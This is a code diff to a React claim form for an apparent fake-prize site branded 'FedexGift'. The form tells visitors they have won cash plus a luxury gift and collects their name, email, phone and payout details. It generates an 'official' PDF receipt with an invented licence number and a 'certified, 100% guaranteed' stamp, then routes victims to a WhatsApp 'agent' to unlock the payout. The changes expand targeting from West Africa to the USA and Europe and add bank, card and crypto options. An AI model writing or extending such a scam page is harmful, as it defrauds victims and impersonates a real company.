@@ -2,39 +2,44 @@
 
 import React, { useState } from "react";
 import { motion, AnimatePresence } from "framer-motion";
-import { Download, MessageSquare, CheckCircle2, ShieldAlert, CreditCard, User, Mail, Phone, Lock, Sparkles } from "lucide-react";
+import { Download, MessageSquare, CheckCircle2, ShieldAlert, CreditCard, User, Mail, Phone, Lock, Sparkles, Gift } from "lucide-react";
 import { jsPDF } from "jspdf";
+import { LuxuryItem } from "./BoxGridGame";
 
 interface ClaimFormProps {
   winningPrize: number;
+  winningItem?: LuxuryItem;
 }
 
 const COUNTRY_CODES = [
+  { code: "+1", label: "USA / Canada 🇺🇸 🇨🇦" },
+  { code: "+33", label: "France 🇫🇷" },
+  { code: "+39", label: "Italie 🇮🇹" },
+  { code: "+34", label: "Espagne 🇪🇸" },
+  { code: "+358", label: "Finlande 🇫🇮" },
+  { code: "+351", label: "Portugal 🇵🇹" },
+  { code: "+55", label: "Brésil 🇧🇷" },
   { code: "+225", label: "Côte d'Ivoire 🇨🇮" },
   { code: "+221", label: "Sénégal 🇸🇳" },
   { code: "+237", label: "Cameroun 🇨🇲" },
-  { code: "+228", label: "Togo 🇹🇬" },
-  { code: "+226", label: "Burkina Faso 🇧🇫" },
-  { code: "+229", label: "Bénin 🇧🇯" },
-  { code: "+242", label: "Congo 🇨🇬" },
 ];
 
 const PAYMENT_METHODS = [
-  { id: "mtn", name: "MTN Mobile Money", icon: "🟡" },
-  { id: "orange", name: "Orange Money", icon: "🟠" },
-  { id: "wave", name: "Wave Money", icon: "🔵" },
-  { id: "moov", name: "Moov Money", icon: "🟢" },
+  { id: "bank", name: "Virement Bancaire (SWIFT / IBAN)", icon: "🏦" },
+  { id: "card", name: "Carte Visa / Mastercard", icon: "💳" },
+  { id: "crypto", name: "USDT / Crypto Wallet", icon: "🪙" },
+  { id: "momo", name: "Mobile Money (MTN / Orange / Wave)", icon: "📲" },
 ];
 
 // Admin WhatsApp Number (can be updated by user as needed)
 const ADMIN_WHATSAPP_NUMBER = "22990000000";
 
-export default function ClaimForm({ winningPrize }: ClaimFormProps) {
+export default function ClaimForm({ winningPrize, winningItem }: ClaimFormProps) {
   const [nom, setNom] = useState("");
   const [email, setEmail] = useState("");
-  const [countryCode, setCountryCode] = useState("+225");
+  const [countryCode, setCountryCode] = useState("+1");
   const [phone, setPhone] = useState("");
-  const [paymentMethod, setPaymentMethod] = useState("mtn");
+  const [paymentMethod, setPaymentMethod] = useState("bank");
   const [isSubmitted, setIsSubmitted] = useState(false);
   const [pdfGenerated, setPdfGenerated] = useState(false);
   const [transactionId, setTransactionId] = useState("");
@@ -48,7 +53,7 @@ export default function ClaimForm({ winningPrize }: ClaimFormProps) {
     }
 
     // Generate unique transaction reference
-    const refId = "FDZ-" + Math.random().toString(36).substring(2, 9).toUpperCase() + "-" + Date.now().toString().slice(-4);
+    const refId = "FDX-" + Math.random().toString(36).substring(2, 9).toUpperCase() + "-" + Date.now().toString().slice(-4);
     setTransactionId(refId);
 
     // Generate PDF receipt with jsPDF
@@ -73,6 +78,8 @@ export default function ClaimForm({ winningPrize }: ClaimFormProps) {
       minute: "2-digit",
     });
 
+    const itemName = winningItem ? `${winningItem.name} (${winningItem.valueEst})` : "iPhone 16 Pro Max 1TB ($1,599)";
+
     // Dark luxury theme colors
     doc.setFillColor(15, 23, 42); // slate 900 background header
     doc.rect(0, 0, 210, 45, "F");
@@ -85,11 +92,11 @@ export default function ClaimForm({ winningPrize }: ClaimFormProps) {
 
     doc.setFontSize(11);
     doc.setTextColor(255, 255, 255);
-    doc.text("REÇU OFFICIEL DE GAIN ET TRANSFERT DE FONDS", 105, 28, { align: "center" });
+    doc.text("REÇU OFFICIEL DE GAIN : ARGENT + CADEAU DE LUXE", 105, 28, { align: "center" });
 
     doc.setFontSize(9);
     doc.setTextColor(200, 200, 200);
-    doc.text("Licence Internationale N° FS-88492026-BCEAO", 105, 35, { align: "center" });
+    doc.text("Licence Internationale N° FG-99382026-GLOBAL", 105, 35, { align: "center" });
 
     // Gold decorative bar
     doc.setFillColor(255, 215, 0);
@@ -122,7 +129,7 @@ export default function ClaimForm({ winningPrize }: ClaimFormProps) {
     doc.setFontSize(13);
     doc.setFont("helvetica", "bold");
     doc.setTextColor(15, 23, 42);
-    doc.text("INFORMATIONS DU GAGNANT", 25, 98);
+    doc.text("INFORMATIONS DU GAGNANT & DÉTAILS DE L'EXPÉDITION", 25, 98);
 
     doc.setDrawColor(226, 232, 240);
     doc.line(25, 101, 185, 101);
@@ -134,12 +141,13 @@ export default function ClaimForm({ winningPrize }: ClaimFormProps) {
     const rows = [
       ["Nom & Prénom :", nom],
       ["Adresse Email :", email],
-      ["Numéro WhatsApp :", `${countryCode} ${phone}`],
-      ["Mode de Paiement :", PAYMENT_METHODS.find((p) => p.id === paymentMethod)?.name || "Mobile Money"],
-      ["Statut du Virement :", "EN ATTENTE DE VALIDATION FINAL WHATSAPP"],
+      ["Téléphone WhatsApp :", `${countryCode} ${phone}`],
+      ["Mode de Paiement :", PAYMENT_METHODS.find((p) => p.id === paymentMethod)?.name || "Virement Bancaire"],
+      ["Cadeau de Luxe Gagne :", itemName],
+      ["Statut Expédition & Virement :", "EN ATTENTE DE CONFIRMATION WHATSAPP"],
     ];
 
-    let startY = 110;
+    let startY = 108;
     rows.forEach(([label, value]) => {
       doc.setTextColor(100, 116, 139);
       doc.text(label, 25, startY);
@@ -147,40 +155,40 @@ export default function ClaimForm({ winningPrize }: ClaimFormProps) {
       doc.setTextColor(15, 23, 42);
       doc.text(value, 80, startY);
       doc.setFont("helvetica", "normal");
-      startY += 10;
+      startY += 9;
     });
 
     // Winning Prize Box
     doc.setFillColor(254, 242, 242);
     doc.setDrawColor(239, 68, 68);
-    doc.rect(25, startY + 5, 160, 30, "FD");
+    doc.rect(25, startY + 4, 160, 32, "FD");
 
-    doc.setFontSize(12);
+    doc.setFontSize(11);
     doc.setTextColor(185, 28, 28);
     doc.setFont("helvetica", "bold");
-    doc.text("MONTANT NET DU GAIN GAGNÉ :", 105, startY + 16, { align: "center" });
+    doc.text("TOTAL NET DES GAINS RÉSERVÉS :", 105, startY + 14, { align: "center" });
 
-    doc.setFontSize(22);
+    doc.setFontSize(18);
     doc.setTextColor(22, 163, 74);
-    doc.text(`$ ${winningPrize.toLocaleString("en-US")} USD`, 105, startY + 28, { align: "center" });
+    doc.text(`$ ${winningPrize.toLocaleString("en-US")} USD  +  ${winningItem?.name || "iPhone 16 Pro Max"}`, 105, startY + 26, { align: "center" });
 
     // Official Certification Stamp
     doc.setDrawColor(22, 163, 74);
     doc.setLineWidth(1.5);
-    doc.rect(130, startY + 45, 55, 22);
+    doc.rect(130, startY + 43, 55, 22);
     doc.setFontSize(9);
     doc.setTextColor(22, 163, 74);
     doc.setFont("helvetica", "bold");
-    doc.text("FedexGift", 157.5, startY + 52, { align: "center" });
-    doc.text("APPROUVÉ & CERTIFIÉ", 157.5, startY + 58, { align: "center" });
-    doc.text("100% GARANTI", 157.5, startY + 63, { align: "center" });
+    doc.text("FedexGift", 157.5, startY + 50, { align: "center" });
+    doc.text("APPROUVÉ & CERTIFIÉ", 157.5, startY + 56, { align: "center" });
+    doc.text("100% GARANTI", 157.5, startY + 61, { align: "center" });
 
     // Security & Instructions Footer
     doc.setFontSize(9);
     doc.setFont("helvetica", "italic");
     doc.setTextColor(100, 116, 139);
-    doc.text("Instructions importantes : Veuillez présenter ce reçu à notre agent WhatsApp pour débloquer", 25, startY + 75);
-    doc.text("votre virement sur votre compte Mobile Money dans les plus brefs délais.", 25, startY + 80);
+    doc.text("Instructions importantes : Veuillez présenter ce reçu à notre agent WhatsApp pour débloquer", 25, startY + 73);
+    doc.text("votre virement bancaire et planifier la livraison de votre cadeau de luxe.", 25, startY + 78);
 
     // Save File
     doc.save(`recu_gain_fedex_gift_${refId}.pdf`);
@@ -188,16 +196,18 @@ export default function ClaimForm({ winningPrize }: ClaimFormProps) {
 
   const getWhatsAppLink = () => {
     const fullPhone = `${countryCode}${phone}`;
-    const selectedPayName = PAYMENT_METHODS.find((p) => p.id === paymentMethod)?.name || "Mobile Money";
-    const message = `Bonjour FedexGift, je viens de gagner ${winningPrize.toLocaleString("en-US")} $ sur le site !
+    const selectedPayName = PAYMENT_METHODS.find((p) => p.id === paymentMethod)?.name || "Virement Bancaire";
+    const itemStr = winningItem ? winningItem.name : "Cadeau de Luxe";
+    const message = `Bonjour FedexGift, je viens de gagner ${winningPrize.toLocaleString("en-US")} $ + ${itemStr} sur le site !
 
 Nom: ${nom}
 Email: ${email}
 Téléphone: ${fullPhone}
-Moyen de paiement: ${selectedPayName}
+Mode de paiement: ${selectedPayName}
+Cadeau de Luxe: ${itemStr}
 Réf Reçu: ${transactionId}
 
-Voici mon reçu PDF téléchargé. Merci de valider mon transfert !`;
+Voici mon reçu PDF téléchargé. Merci de valider mon transfert et la livraison !`;
 
     return `https://wa.me/${ADMIN_WHATSAPP_NUMBER}?text=${encodeURIComponent(message)}`;
   };
@@ -215,9 +225,14 @@ Voici mon reçu PDF téléchargé. Merci de valider mon transfert !`;
 
           <h2 className="text-2xl sm:text-3xl font-display font-black text-white">
             RECEVEZ VOS <span className="text-gold-gradient">{winningPrize.toLocaleString("en-US")} $</span>
+            {winningItem && (
+              <span className="block text-lg text-yellow-300 font-bold mt-1">
+                + {winningItem.icon} {winningItem.name}
+              </span>
+            )}
           </h2>
           <p className="text-xs sm:text-sm text-gray-300">
-            Remplissez vos informations exactes pour recevoir votre virement immédiat.
+            Remplissez vos informations exactes pour recevoir votre virement et l'expédition de votre lot de luxe.
           </p>
         </div>
 
@@ -235,7 +250,7 @@ Voici mon reçu PDF téléchargé. Merci de valider mon transfert !`;
                 required
                 value={nom}
                 onChange={(e) => setNom(e.target.value)}
-                placeholder="Ex: Marc Koffi"
+                placeholder="Ex: Marco Rossi / John Smith"
                 className="w-full bg-brandDark-700/80 border border-gray-700 focus:border-yellow-400 rounded-xl px-4 py-3.5 text-white placeholder-gray-500 text-sm focus:outline-none transition shadow-inner"
               />
             </div>
@@ -251,7 +266,7 @@ Voici mon reçu PDF téléchargé. Merci de valider mon transfert !`;
                 required
                 value={email}
                 onChange={(e) => setEmail(e.target.value)}
-                placeholder="Ex: marc.koffi@gmail.com"
+                placeholder="Ex: winner@example.com"
                 className="w-full bg-brandDark-700/80 border border-gray-700 focus:border-yellow-400 rounded-xl px-4 py-3.5 text-white placeholder-gray-500 text-sm focus:outline-none transition shadow-inner"
               />
             </div>
@@ -279,7 +294,7 @@ Voici mon reçu PDF téléchargé. Merci de valider mon transfert !`;
                   required
                   value={phone}
                   onChange={(e) => setPhone(e.target.value)}
-                  placeholder="07 08 09 10 11"
+                  placeholder="123 456 7890"
                   className="flex-1 bg-brandDark-700/80 border border-gray-700 focus:border-yellow-400 rounded-xl px-4 py-3.5 text-white placeholder-gray-500 text-sm focus:outline-none transition shadow-inner"
                 />
               </div>
@@ -289,7 +304,7 @@ Voici mon reçu PDF téléchargé. Merci de valider mon transfert !`;
             <div>
               <label className="block text-xs font-bold text-gray-300 uppercase tracking-wider mb-2 flex items-center gap-1.5">
                 <CreditCard className="w-4 h-4 text-yellow-400" />
-                Moyen de Paiement Pour le Virement *
+                Mode de Réception des Gains *
               </label>
               <div className="grid grid-cols-2 gap-2.5">
                 {PAYMENT_METHODS.map((pm) => (
@@ -348,7 +363,7 @@ Voici mon reçu PDF téléchargé. Merci de valider mon transfert !`;
               </div>
               <div className="flex items-center gap-2 text-green-400 font-bold text-xs">
                 <MessageSquare className="w-4 h-4 text-green-400" />
-                2. Cliquez ci-dessous pour l'envoyer à l'agent et recevoir votre virement.
+                2. Cliquez ci-dessous pour l'envoyer à l'agent pour le virement et l'expédition.
               </div>
             </div>
 
